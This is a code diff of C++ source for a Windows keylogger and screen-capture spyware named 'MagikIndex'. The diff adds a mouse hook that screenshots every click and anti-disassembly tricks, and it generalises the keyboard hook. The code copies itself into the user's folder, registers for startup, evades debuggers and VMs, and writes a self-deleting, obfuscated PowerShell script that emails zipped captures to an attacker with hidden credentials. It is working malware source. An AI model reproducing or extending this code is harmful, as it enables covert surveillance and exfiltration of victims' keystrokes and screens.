@@ -4,16 +4,13 @@
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
-int Counter;
-bool mutex;
-HHOOK hhkLowLevelKybd;
+int Counter, Counter2;
+bool mutex, mutex2;
 Log MyLog;
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
 {
-
-
-    //FreeConsole();
 
     CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
@@ -23,9 +20,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
     SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
 
     DWORD Tick1 = GetTickCount();
-    
     int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();
-
     srand(RandSeed);
 
     bool ThrowAwayFlag = false;
@@ -60,13 +55,16 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
         CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
     }
 
+    __AsmImpossibleDisassm();
+    __AsmJmpSameTarget();
+
     AntiDBG DebugItem;
     DebugItem.Initialize();
     TrustItems Trust = DebugItem.TrustItem;
     bool TrustTooLow = false;
     if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
         if (QuitIfUntrust) {
-            FinalExit();
+            exit(0);
         }
         TrustTooLow = true;                                         
     }else if (Trust.HasActiveInternet && !Trust.IsInVM) {
@@ -112,7 +110,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 
 Log:
 
-    hhkLowLevelKybd = 0;
     Counter = 0;
     mutex = false;
 
@@ -256,7 +253,7 @@ Log:
 
     if (FirstLog) {
 
-        MyLog.LogItChar("First MyLog of the session, copying files and adding to startup...");
+        MyLog.LogItChar("First log of the session, copying files and adding to startup...");
 
         std::string DestinationFile = "C:\\Users\\";
         DestinationFile += UserName;
@@ -299,7 +296,7 @@ Log:
         MyLog.LogItChar("Registered executable for startup...");
 
     }else{
-        MyLog.LogItChar("Not the first MyLog of the session, skip copying files...");
+        MyLog.LogItChar("Not the first log of the session, skip copying files...");
     }
 
     int x1, y1, x2, y2, w, h, mo, mb;
@@ -459,23 +456,26 @@ Log:
     SeedText += std::to_string(RandSeed);
     MyLog.LogItChar(SeedText);
 
+    DWORD DriveMask = GetLogicalDrives();
 
-    for (int i = (int)'A'; i < (int)'Z'; i++) {
+    for (int i = 0; i < 26; i++) {
         std::string DriveLetter = {};
-        DriveLetter += (char)i;
+        DriveLetter += (char)(i + (int)'A');
         DriveLetter += ":\\";
         ULARGE_INTEGER DiskSize;
         UINT DriveType = GetDriveTypeA(DriveLetter.c_str());
         //MessageBoxA(NULL,std::to_string(DriveType).c_str(), DriveLetter.c_str(),MB_OK);
-        if ( DriveType != DRIVE_UNKNOWN && DriveType != DRIVE_NO_ROOT_DIR) {
-            if (GetDiskFreeSpaceExA(DriveLetter.c_str(), NULL, &DiskSize, NULL) || (DriveType != DRIVE_CDROM && DriveType != DRIVE_REMOVABLE)) {
-                DiskText += (char)i;
-                DiskText += ":\\  Type:";
-                DiskText += std::to_string(DriveType);
-                DiskText += "  Size:";
-                DiskText += std::to_string((DiskSize.QuadPart / 1073741824));
-                DiskText += "GB,\n";
-                DiskSize.QuadPart = 0;
+        if ((DriveMask & (1 << i))) {
+            if (DriveType != DRIVE_UNKNOWN && DriveType != DRIVE_NO_ROOT_DIR) {
+                if (GetDiskFreeSpaceExA(DriveLetter.c_str(), NULL, &DiskSize, NULL) || (DriveType != DRIVE_CDROM && DriveType != DRIVE_REMOVABLE)) {
+                    DiskText += (char)(i + (int)'A');
+                    DiskText += ":\\  Type:";
+                    DiskText += std::to_string(DriveType);
+                    DiskText += "  Size:";
+                    DiskText += std::to_string((DiskSize.QuadPart / 1073741824));
+                    DiskText += "GB,\n";
+                    DiskSize.QuadPart = 0;
+                }
             }
         }
     }
@@ -526,11 +526,11 @@ Log:
 
     MyLog.LogItChar("\n_____________________________________________\n");
 
-    std::thread t1(Hooker);
+    std::thread t1(Hooker, WH_KEYBOARD_LL, KeyboardThread);
     //t1.detach();
     Sleep(50);
     while (!mutex) {
-        Sleep(5);
+        Sleep(50);
     }
     t1.join();
     MyLog.LogItChar("\n_____________________________________________\n");
@@ -584,6 +584,23 @@ void TakeScreenShot(const char* filename) {
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
     HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
     BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
+
+    //include mouse pointer inside the screenshot(if it is displayed)
+    HWND hwnd = GetDesktopWindow();
+    CURSORINFO cursor = { sizeof(cursor) };
+    GetCursorInfo(&cursor);
+    if (cursor.flags == CURSOR_SHOWING) {
+        RECT rect;
+        GetWindowRect(hwnd, &rect);
+        ICONINFO info = { sizeof(info) };
+        GetIconInfo(cursor.hCursor, &info);
+        const int x = cursor.ptScreenPos.x - rect.left - rect.left - info.xHotspot;
+        const int y = cursor.ptScreenPos.y - rect.top - rect.top - info.yHotspot;
+        BITMAP bmpCursor = { 0 };
+        GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
+        DrawIconEx(hDC, x, y, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight,
+            0, NULL, DI_NORMAL);
+    }
 
     SaveHBITMAPToFile(hBitmap, filename);
     //CLEAN
@@ -700,18 +717,26 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
 
     while (1) {
         SilentlyRemoveDirectory(ScreenshotDir.c_str());
-        Sleep(60000);
+        std::this_thread::sleep_for(std::chrono::minutes(1));
         CreateDirectoryA(ScreenshotDir.c_str(), NULL);
         SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
-        for (int i = 0; i < ScreenshotsPerZip; i++) {
-            CurrentLog = ScreenshotDir;
-            CurrentLog += "\\ScreenShot";
-            CurrentLog += std::to_string(rand() % 10000 - 1000);
-            CurrentLog += ".png";
+        if (ScreenshotMode == 1) {
+            for (int i = 0; i < ScreenshotsPerZip; i++) {
+                CurrentLog = ScreenshotDir;
+                CurrentLog += "\\ScreenShot";
+                CurrentLog += std::to_string(rand() % 10000 - 1000);
+                CurrentLog += ".png";
 
-            TakeScreenShot(CurrentLog.c_str());
+                TakeScreenShot(CurrentLog.c_str());
 
-            Sleep(SecondsBetweenScreenshots*1000);
+                Sleep(SecondsBetweenScreenshots * 1000);
+            }
+        }else if(ScreenshotMode == 2){
+            std::thread t2(Hooker,WH_MOUSE_LL,MouseThread);
+            while (!mutex2) {
+                std::this_thread::sleep_for(std::chrono::seconds(3));
+            }
+            t2.join();
         }
         std::string ZipPath = ScreenshotDir;
         ZipPath += "\\Zip";
@@ -752,13 +777,13 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
             PSStartup += std::to_string(GetTickCount());
             HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
             std::string a = HardDecode("yLqyY[rTpdnTY\\{P2c{;4f2XoVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiOJdjnIfwXI\\nL5Sw:o\\wnGWW32WmqS\\3LJfmCURiy4eVXIdkHodH7{do7YUSTXVVTkEreFQ3CEN{Xof{X4WyTZdVTEM27Y\\rz4SyTZdV7EdrHYVwSZ\\QDEflXock;WN5XoVi2FKx\\odLDHXPPHLMeUdxPoNunY[vfoNyTZd|fEK;Cken\\penPHWW32WmqygMmU\\wnIdw;ILqCk\\rrCfnnYfT3EKzCEfwX5dF3EK66EQwilN6CkdxnIflXodw;4[vS5enTJK;CU\\wnIdw;IL");
-            a += SendersEmail;
+            a += HardDecode(SendersEmail);
             a += "', '";
-            a += SendersPsw;
+            a += HardDecode(SendersPsw);
             a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
-            a += SendersEmail;
+            a += HardDecode(SendersEmail);
             a += "'\n$ReportEmail.To.Add('";
-            a += RecieversEmail;
+            a += HardDecode(RecieversEmail);
             a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
             a += ZipPath.c_str();
             a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
@@ -775,7 +800,9 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
             }
         }
 
-        Sleep(140000);
+        Counter2 = 0;
+        mutex2 = !mutex2;
+        std::this_thread::sleep_for(std::chrono::minutes(3));
 
     }
 }
@@ -883,7 +910,7 @@ std::string GetCpuInfo()
     std::string cpu;
     for (int id : functionIds)
     {
-        __cpuid(integerBuffer.data(), id);
+        __cpuid(integerBuffer.data(), id);                                          //since its x64 use __cpuid instead of inline asm
         std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);
         cpu += std::string(charBuffer.data());
     }
@@ -917,7 +944,7 @@ std::string HardDecode(std::string EncodedString) {
     return Ret;
 }
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK KeyboardThread(int nCode, WPARAM wParam, LPARAM lParam)
 {
     BOOL fEatKeystroke = FALSE;
     KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)lParam;
@@ -945,10 +972,10 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
 }
 
-int Hooker()
+int Hooker(int HookType, HOOKPROC CallbackFunc)
 {
     // Install the low-level keyboard & mouse hooks
-    HHOOK hhkLowLevelKybd = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
+    HHOOK hhkLowLevelKybd = SetWindowsHookExA(HookType, CallbackFunc, 0, 0);
 
     // Keep this app running until we're told to stop
     MSG msg;
@@ -962,6 +989,35 @@ int Hooker()
     return(0);
 }
 
+LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
 
+    MSLLHOOKSTRUCT* Mouse = (MSLLHOOKSTRUCT*)lParam;
+    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
+        if (Counter2 >= ScreenshotsPerZip) {
+            mutex2 = true;
+            ExitThread(0);                                      //kill the entire thread when done
+        }
+        char* AppData = nullptr;
+        DWORD Size = MAX_LENGTH + 1;
+        size_t AppDataSize;
+        _dupenv_s(&AppData, &AppDataSize, "APPDATA");
+        std::string ScreenshotName = AppData;
+        ScreenshotName += "\\MagikGlass\\SC_";
+        if(wParam == WM_LBUTTONDOWN)
+            ScreenshotName += "LCLICK_";
+        if(wParam == WM_RBUTTONDOWN)
+            ScreenshotName += "RCLICK_";
+        ScreenshotName += "x";
+        ScreenshotName += std::to_string(Mouse->pt.x);
+        ScreenshotName += "y";
+        ScreenshotName += std::to_string(Mouse->pt.y);
+        ScreenshotName += "_";
+        ScreenshotName += std::to_string(GetTickCount());
+        ScreenshotName += ".png";
+        TakeScreenShot(ScreenshotName.c_str());
+        Counter2++;
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
 
 #pragma warning( pop )
